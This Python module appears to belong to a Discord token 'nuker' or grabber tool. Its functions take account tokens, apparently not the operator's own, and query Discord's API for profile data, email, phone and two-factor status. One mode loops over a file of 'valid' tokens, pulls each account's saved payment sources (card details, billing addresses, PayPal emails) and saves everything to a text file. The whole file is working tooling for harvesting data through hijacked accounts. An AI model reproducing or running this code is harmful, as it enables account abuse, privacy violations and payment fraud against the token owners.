from requests import get
from .tokens import TokensTool
# from messages import (
#     exitMenu,
#     infograbMenu,
#     helpGrabInfoEN,
#     helpGrabInfoRU,
#     statuses,
#     menu,
#     cc_digits
# )
import messages
from datetime import datetime

class Info:
    def __init__(self) -> None:
        """
        Initialization
        """
        self.tinfo = TokensTool()

    def grabInfo(self):
        sessionName = "Info grab"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.infograbMenu)
        try:
            select = str(input("\nSelect: "))
            if select == "1":
                token = input("\nToken: ")
                if self.tinfo.validToken(token, for_nuker=True) == "Valid.":
                    headers = {"Authorization": token, "Content-Type": "application/json"}
                    r = get(
                        "https://canary.discordapp.com/api/v8/users/@me", headers=headers
                    )
                    if r.status_code in messages.statuses:
                        userName = r.json()["username"] + "#" + r.json()["discriminator"]
                        userID = r.json()["id"]
                        phone = r.json()["phone"]
                        email = r.json()["email"]
                        mfa = r.json()["mfa_enabled"]
                        bio = r.json()["bio"]
                        avatar = (
                            r.json()["avatar"]
                            if r.json()["avatar"] is not None
                            else "Default"
                        )
                        banner = (
                            r.json()["banner"]
                            if r.json()["banner"] is not None
                            else "Default"
                        )
                        banner_color = r.json()["banner_color"]
                        locale = r.json()["locale"]
                        nsfw = r.json()["nsfw_allowed"]
                        verif = r.json()["verified"]
                        print(
                            f"""\n
            User Name: {userName}
            User ID: {userID}
            Bio: {bio}
            Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.png" if not avatar == "Default" else avatar}
            Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.png" if not avatar == "Default" else banner}
            Banner color: {banner_color}
            Locale: {locale}
            NSFW allowed? {nsfw}
            2 Factor: {mfa}
            Email: {email}
            Verified? {verif}
            Phone Number: {phone if phone else 'None.'}
                        """
                        )
                else:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Token is {self.tinfo.validToken(token, for_nuker=True)}]\n"
                    )
                    print(f"{token} is {self.tinfo.validToken(token, for_nuker=True)}")
            elif select == "2":
                token = input("\nToken: ")
                # print(validToken(token, False, True))
                if self.tinfo.validToken(token, False, True) == "Valid.":
                    headers = {"Authorization": "Bot " + token}
                    r = get("https://discord.com/api/v8/users/@me", headers=headers)
                    if r.status_code in messages.statuses:
                        botId = r.json()["id"]
                        botName = r.json()["username"] + "#" + r.json()["discriminator"]
                        botAvatar = (
                            r.json()["avatar"]
                            if r.json()["avatar"] is not None
                            else "Default"
                        )
                        botBio = r.json()["bio"] if r.json()["bio"] != "" else "No Bio"
                        print(
                            f"""
            Bot Name: {botName}
            Bot ID: {botId}
            avatar: {f"https://cdn.discordapp.com/avatars/{botId}/{botAvatar}.png" if not botAvatar == "Default" else botAvatar}
            bio: {botBio}
                        """
                        )
            elif select == "3":
                print(messages.menu)
                select = str(input("\nSelect: "))
                if select == "1":
                    print(messages.helpGrabInfoEN)
                elif select == "2":
                    print(messages.helpGrabInfoRU)
                else:
                    print("\nInvalid option.")
            elif select == "4":
                info = list()
                try:
                    with open("valid_tokens.txt", "r") as handle:
                        tokens = handle.readlines()
                        for x in tokens:
                            token = x.rstrip()
                            headers = {"Authorization": token}
                            r = get(
                                "https://canary.discordapp.com/api/v8/users/@me",
                                headers=headers,
                            )
                            if r.status_code in messages.statuses:
                                userName = (
                                    r.json()["username"] + "#" + r.json()["discriminator"]
                                )
                                userID = r.json()["id"]
                                phone = r.json()["phone"]
                                email = r.json()["email"]
                                mfa = r.json()["mfa_enabled"]
                                bio = r.json()["bio"]
                                avatar = (
                                    r.json()["avatar"]
                                    if r.json()["avatar"] is not None
                                    else "Default"
                                )
                                banner = (
                                    r.json()["banner"]
                                    if r.json()["banner"] is not None
                                    else "Default"
                                )
                                banner_color = r.json()["banner_color"]
                                locale = r.json()["locale"]
                                nsfw = r.json()["nsfw_allowed"]
                                verif = r.json()["verified"]
                                info.append(
                                    f"""\n
    User Name: {userName}
    User ID: {userID}
    Bio: {bio}
    Avatar: {f"https://cdn.discordapp.com/avatars/{userID}/{avatar}.png" if not avatar == "Default" else avatar}
    Banner: {f"https://cdn.discordapp.com/banners/{userID}/{banner}.png" if not banner == "Default" else banner}
    Banner color: {banner_color}
    Locale: {locale}
    NSFW allowed? {nsfw}
    2 Factor: {mfa}
    Email: {email}
    Verified? {verif}
    Phone Number: {phone if phone else 'None.'}
                                """
                                )
                                req = get(
                                    "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                    headers={"Authorization": token},
                                )
                                grabreq = req.json()
                                if req.status_code in messages.statuses and grabreq != []:
                                    for grab in grabreq:
                                        grab1 = grab["billing_address"]
                                        name = grab1["name"]
                                        address1 = grab1["line_1"]
                                        address2 = grab1["line_2"]
                                        city = grab1["city"]
                                        postalСode = grab1["postal_code"]
                                        state = grab1["state"]
                                        country = grab1["country"]
                                        if grab["type"] == 1:
                                            cc_brand = grab["brand"]
                                            cc_first = messages.cc_digits.get(cc_brand)
                                            cc_last = grab["last_4"]
                                            cc_month = str(grab["expires_month"])
                                            cc_year = str(grab["expires_year"])
                                            card = f"""
    Payment Type: Credit card
    Valid: {not grab['invalid']}
    CC Holder Name: {name}
    CC Brand: {cc_brand.title()}
    CC Number: {''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last))}
    CC Date: {('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4]}
    Address 1: {address1}
    Address 2: {address2 if address2 else ''}
    City: {city}
    Postal code: {postalСode}
    State: {state if state else ''}
    Country: {country}
    Default Payment Method: {grab['default']}
                                            """
                                        elif grab["type"] == 2:
                                            card = f"""
    Payment Type: PayPal
    Valid: {not grab['invalid']}
    PayPal Name: {name}
    PayPal Email: {grab['email']}
    Address 1: {address1}
    Address 2: {address2 if address2 else ''}
    City: {city}
    Postal code: {postalСode}
    State: {state if state else ''}
    Country: {country}
    Default Payment Method: {grab['default']}
                                            """
                                        info.append(card)
                                else:
                                    errorLog.write(
                                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                                    )
                                    info.append("No cards in account =(")
                    with open("!_valid_tokens_info.txt", "w") as token:
                        for toke in info:
                            token.write(f"{toke}\n")
                    print("\nI save valid tokens info in `!_valid_tokens_info.txt` file.")
                except IOError:
                    print(
                        "I can't find valid_tokens.txt file. You checked tokens in option 4?"
                    )
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

